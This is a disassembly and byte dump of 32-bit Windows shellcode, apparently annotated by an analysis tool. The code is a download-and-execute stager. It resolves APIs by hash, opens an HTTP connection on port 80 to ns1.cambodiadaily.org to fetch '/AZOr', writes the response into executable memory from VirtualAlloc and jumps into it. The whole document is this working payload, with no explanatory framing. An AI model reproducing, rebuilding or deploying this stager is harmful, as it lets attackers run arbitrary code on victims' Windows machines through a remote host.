0x0000000f 8b520c           mov edx,dword [edx + 12]
0x00000012 8b5214           mov edx,dword [edx + 20]
0x00000015 8b7228           mov esi,dword [edx + 40]
0x00000018 0fb74a26         movzx ecx,word [edx + 38]
0x0000001c 31ff             xor edi,edi
0x0000001e 31c0             xor eax,eax
0x00000020 ac               lodsb 
0x00000021 3c61             cmp al,97
0x00000023 7c02             jl 0x00000027
0x00000025 2c20             sub al,32
0x00000027 c1cf0d           ror edi,13
0x0000002a 01c7             add edi,eax
0x0000002c e2f0             loop 0x0000001e
0x0000002e 52               push edx
0x0000002f 57               push edi
0x00000030 8b5210           mov edx,dword [edx + 16]
0x00000033 8b423c           mov eax,dword [edx + 60]
0x00000036 01d0             add eax,edx
0x00000038 8b4078           mov eax,dword [eax + 120]
0x0000003b 85c0             test eax,eax
0x0000003d 744a             jz 0x00000089
0x0000003f 01d0             add eax,edx
0x00000041 50               push eax
0x00000042 8b4818           mov ecx,dword [eax + 24]
0x00000045 8b5820           mov ebx,dword [eax + 32]
0x00000048 01d3             add ebx,edx
0x0000004a e33c             jecxz 0x00000088
0x0000004c 49               dec ecx
0x0000004d 8b348b           mov esi,dword [ebx + ecx * 4]
0x00000050 01d6             add esi,edx
0x00000052 31ff             xor edi,edi
0x00000054 31c0             xor eax,eax
0x00000056 ac               lodsb 
0x00000057 c1cf0d           ror edi,13
0x0000005a 01c7             add edi,eax
0x0000005c 38e0             cmp al,ah
0x0000005e 75f4             jnz 0x00000054
0x00000060 037df8           add edi,dword [ebp - 8]
0x00000063 3b7d24           cmp edi,dword [ebp + 36]
0x00000066 75e2             jnz 0x0000004a
0x00000068 58               pop eax
0x00000069 8b5824           mov ebx,dword [eax + 36]
0x0000006c 01d3             add ebx,edx
0x0000006e 668b0c4b         mov cx,word [ebx + ecx * 2]
0x00000072 8b581c           mov ebx,dword [eax + 28]
0x00000075 01d3             add ebx,edx
0x00000077 8b048b           mov eax,dword [ebx + ecx * 4]
0x0000007a 01d0             add eax,edx
0x0000007c 89442424         mov dword [esp + 36],eax
0x00000080 5b               pop ebx
0x00000081 5b               pop ebx
0x00000082 61               popad 
0x00000083 59               pop ecx
0x00000084 5a               pop edx
0x00000085 51               push ecx
0x00000086 ffe0             jmp eax
0x00000088 58               pop eax
0x00000089 5f               pop edi
0x0000008a 5a               pop edx
0x0000008b 8b12             mov edx,dword [edx]
0x0000008d eb86             jmp 0x00000015
0x0000008f 5d               pop ebp
0x00000090 686e657400       push 0x0074656e--> 'ten'
0x00000095 6877696e69       push 0x696e6977--> 'iniw'
0x0000009a 54               push esp
0x0000009b 684c772607       push 0x0726774c--> '&wL'
0x000000a0 ffd5             call ebp --> kernel32.dll!LoadLibraryA
0x000000a2 e880000000       call 0x00000127
0x000000a7 4d               dec ebp
0x000000a8 6f               outsd edx,dword [esi]
0x000000a9 7a69             jpe 0x00000114
0x000000ab 6c               insb byte [esi],edx
0x000000ac 6c               insb byte [esi],edx
0x000000ad 61               popad 
0x000000ae 2f               das 
0x000000af 352e302028       xor eax,0x2820302e
0x000000b4 636f6d           arpl word [edi + 109],bp
0x000000b7 7061             jo 0x0000011a
0x000000b9 7469             jz 0x00000124
0x000000bb 626c653b         bound ebp,dword [ebp + 59]
0x000000bf 204d53           and byte [ebp + 83],cl
0x000000c2 49               dec ecx
0x000000c3 45               inc ebp
0x000000c4 2031             and byte [ecx],dh
0x000000c6 302e             xor byte [esi],ch
0x000000c8 303b             xor byte [ebx],bh
0x000000ca 205769           and byte [edi + 105],dl
0x000000cd 6e               outsb edx,byte [esi]
0x000000ce 646f             fs: outsd edx,dword [esi]
0x000000d0 7773             ja 0x00000145
0x000000d2 204e54           and byte [esi + 84],cl
0x000000d5 2036             and byte [esi],dh
0x000000d7 2e323b           cs: xor bh,byte [ebx]
0x000000da 205769           and byte [edi + 105],dl
0x000000dd 6e               outsb edx,byte [esi]
0x000000de 36343b           ss: xor al,59
0x000000e1 207836           and byte [eax + 54],bh
0x000000e4 343b             xor al,59
0x000000e6 20547269         and byte [edx + esi * 2 + 105],dl
0x000000ea 64656e           fsgs: outsb edx,byte [esi]
0x000000ed 742f             jz 0x0000011e
0x000000ef 362e3029         csss: xor byte [ecx],ch
0x000000f3 005858           add byte [eax + 88],bl
0x000000f6 58               pop eax
0x000000f7 58               pop eax
0x000000f8 58               pop eax
0x000000f9 58               pop eax
0x000000fa 58               pop eax
0x000000fb 58               pop eax
0x000000fc 58               pop eax
0x000000fd 58               pop eax
0x000000fe 58               pop eax
0x000000ff 58               pop eax
0x00000100 58               pop eax
0x00000101 58               pop eax
0x00000102 58               pop eax
0x00000103 58               pop eax
0x00000104 58               pop eax
0x00000105 58               pop eax
0x00000106 58               pop eax
0x00000107 58               pop eax
0x00000108 58               pop eax
0x00000109 58               pop eax
0x0000010a 58               pop eax
0x0000010b 58               pop eax
0x0000010c 58               pop eax
0x0000010d 58               pop eax
0x0000010e 58               pop eax
0x0000010f 58               pop eax
0x00000110 58               pop eax
0x00000111 58               pop eax
0x00000112 58               pop eax
0x00000113 58               pop eax
0x00000114 58               pop eax
0x00000115 58               pop eax
0x00000116 58               pop eax
0x00000117 58               pop eax
0x00000118 58               pop eax
0x00000119 58               pop eax
0x0000011a 58               pop eax
0x0000011b 58               pop eax
0x0000011c 58               pop eax
0x0000011d 58               pop eax
0x0000011e 58               pop eax
0x0000011f 58               pop eax
0x00000120 58               pop eax
0x00000121 58               pop eax
0x00000122 58               pop eax
0x00000123 58               pop eax
0x00000124 58               pop eax
0x00000125 58               pop eax
0x00000126 005931           add byte [ecx + 49],bl
0x00000129 ff5757           call dword [edi + 87]
0x0000012c 57               push edi
0x0000012d 57               push edi
0x0000012e 51               push ecx
0x0000012f 683a5679a7       push 0xa779563a--> 'yV:'
0x00000134 ffd5             call ebp --> wininet.dll!InternetOpenA
0x00000136 eb79             jmp 0x000001b1
0x00000138 5b               pop ebx
0x00000139 31c9             xor ecx,ecx
0x0000013b 51               push ecx
0x0000013c 51               push ecx
0x0000013d 6a03             push 3
0x0000013f 51               push ecx
0x00000140 51               push ecx
0x00000141 6850000000       push 80
0x00000146 53               push ebx
0x00000147 50               push eax
0x00000148 6857899fc6       push 0xc69f8957
0x0000014d ffd5             call ebp --> wininet.dll!InternetConnectA
0x0000014f eb62             jmp 0x000001b3
0x00000151 59               pop ecx
0x00000152 31d2             xor edx,edx
0x00000154 52               push edx
0x00000155 6800026084       push 0x84600200
0x0000015a 52               push edx
0x0000015b 52               push edx
0x0000015c 52               push edx
0x0000015d 51               push ecx
0x0000015e 52               push edx
0x0000015f 50               push eax
0x00000160 68eb552e3b       push 0x3b2e55eb--> ';.U'
0x00000165 ffd5             call ebp --> wininet.dll!HttpOpenRequestA
0x00000167 89c6             mov esi,eax
0x00000169 31ff             xor edi,edi
0x0000016b 57               push edi
0x0000016c 57               push edi
0x0000016d 57               push edi
0x0000016e 57               push edi
0x0000016f 56               push esi
0x00000170 682d06187b       push 0x7b18062d--> '{-'
0x00000175 ffd5             call ebp --> wininet.dll!HttpSendRequestA
0x00000177 85c0             test eax,eax
0x00000179 7444             jz 0x000001bf
0x0000017b 31ff             xor edi,edi
0x0000017d 85f6             test esi,esi
0x0000017f 7404             jz 0x00000185
0x00000181 89f9             mov ecx,edi
0x00000183 eb09             jmp 0x0000018e
0x00000185 68aac5e25d       push 0x5de2c5aa
0x0000018a ffd5             call ebp --> kernel32.dll!GetLastError
0x0000018c 89c1             mov ecx,eax
0x0000018e 6845215e31       push 0x315e2145--> '1^!E'
0x00000193 ffd5             call ebp
0x00000195 31ff             xor edi,edi
0x00000197 57               push edi
0x00000198 6a07             push 7
0x0000019a 51               push ecx
0x0000019b 56               push esi
0x0000019c 50               push eax
0x0000019d 68b757e00b       push 0x0be057b7--> 'W'
0x000001a2 ffd5             call ebp --> wininet.dll!InternetErrorDlg
0x000001a4 bf002f0000       mov edi,0x00002f00
0x000001a9 39c7             cmp edi,eax
0x000001ab 74bc             jz 0x00000169
0x000001ad 31ff             xor edi,edi
0x000001af eb15             jmp 0x000001c6
0x000001b1 eb49             jmp 0x000001fc
0x000001b3 e899ffffff       call 0x00000151
0x000001b8 2f               das 
0x000001b9 41               inc ecx
0x000001ba 5a               pop edx
0x000001bb 4f               dec edi
0x000001bc 7200             jc 0x000001be
0x000001be 0068f0           add byte [eax - 16],ch
0x000001c1 b5a2             mov ch,162
0x000001c3 56               push esi
0x000001c4 ffd5             call ebp
0x000001c6 6a40             push 64
0x000001c8 6800100000       push 4096
0x000001cd 6800004000       push 0x00400000
0x000001d2 57               push edi
0x000001d3 6858a453e5       push 0xe553a458--> 'SX'
0x000001d8 ffd5             call ebp --> kernel32.dll!VirtualAlloc
0x000001da 93               xchg eax,ebx
0x000001db 53               push ebx
0x000001dc 53               push ebx
0x000001dd 89e7             mov edi,esp
0x000001df 57               push edi
0x000001e0 6800200000       push 0x00002000
0x000001e5 53               push ebx
0x000001e6 56               push esi
0x000001e7 68129689e2       push 0xe2899612
0x000001ec ffd5             call ebp --> wininet.dll!InternetReadFile
0x000001ee 85c0             test eax,eax
0x000001f0 74cd             jz 0x000001bf
0x000001f2 8b07             mov eax,dword [edi]
0x000001f4 01c3             add ebx,eax
0x000001f6 85c0             test eax,eax
0x000001f8 75e5             jnz 0x000001df
0x000001fa 58               pop eax
0x000001fb c3               ret 
0x000001fc e837ffffff       call 0x00000138
0x00000201 6e               outsb edx,byte [esi]
0x00000202 7331             jnc 0x00000235
0x00000204 2e63616d         cs: arpl word [ecx + 109],sp
0x00000208 626f64           bound ebp,dword [edi + 100]
0x0000020b 69616461696c79   imul esp,dword [ecx + 100],0x796c6961
0x00000212 2e6f             cs: outsd edx,dword [esi]
0x00000214 7267             jc 0x0000027d
0x00000216 0000             add byte [eax],al

Byte Dump:
......`..1.d.R0.R.R..r(..J&1.1..<a|.,......RW.R..B<...@x..tJ..P.H..X...<I.4...1.1......8.u..}.;}$u.X.X$..f.K.X.........D$$[[aYZQ..X_Z....]hnet.hwiniThLw&........Mozilla/5.0(compatible;MSIE10.0;WindowsNT6.2;Win64;x64;Trident/6.0).XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.Y1.WWWWQh:Vy....y[1.QQj.QQhP...SPhW......bY1.Rh..`.RRRQRPh.U.;....1.WWWWVh-..{....tD1...t....h...]....hE!^1..1.Wj.QVPh.W...../..9.t.1....I...../AZOr..h...V..j@h....h..@.WhX.S....SS..Wh...SVh........t.......u.X..7...ns1.cambodiadaily.org...
